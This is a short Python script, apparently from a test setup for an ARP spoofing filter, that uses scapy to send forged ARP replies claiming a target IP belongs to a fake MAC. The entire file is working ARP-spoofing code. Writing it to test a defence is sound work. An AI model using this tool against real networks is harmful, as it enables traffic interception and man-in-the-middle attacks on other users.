"""Forge ARP replies for the ARP Guard demo.

Usage:
    python3 attack.py            # 10 spoofs with defaults
    python3 attack.py 50         # 50 spoofs
    python3 attack.py 1 --mac aa:bb:cc:dd:ee:ff
"""
import argparse
from scapy.all import ARP, Ether, sendp

VICTIM_IP  = "172.28.55.20"
VICTIM_MAC = "02:42:ac:1c:37:14"
TARGET_IP  = "172.28.55.10"          # IP amit mi állítunk be
FAKE_MAC   = "de:ad:be:ef:00:01"     # hamis MAC amit a szűrő el kell utasítani

ap = argparse.ArgumentParser()
ap.add_argument("count", nargs="?", type=int, default=10,
                help="how many forged ARP replies to send (default 10)")
ap.add_argument("--ip",  default=TARGET_IP,
                help=f"IP to impersonate (default {TARGET_IP})")
ap.add_argument("--mac", default=FAKE_MAC,
                help=f"fake MAC to claim   (default {FAKE_MAC})")
args = ap.parse_args()

pkt = Ether(dst=VICTIM_MAC) / ARP(
    op=2,                # ARP reply
    psrc=args.ip,
    hwsrc=args.mac,
    pdst=VICTIM_IP,
    hwdst=VICTIM_MAC,
)

sendp(pkt, iface="eth0", count=args.count, verbose=False)
print(f"Sent {args.count} forged ARP reply/replies: "
      f"{args.ip} is at {args.mac}")
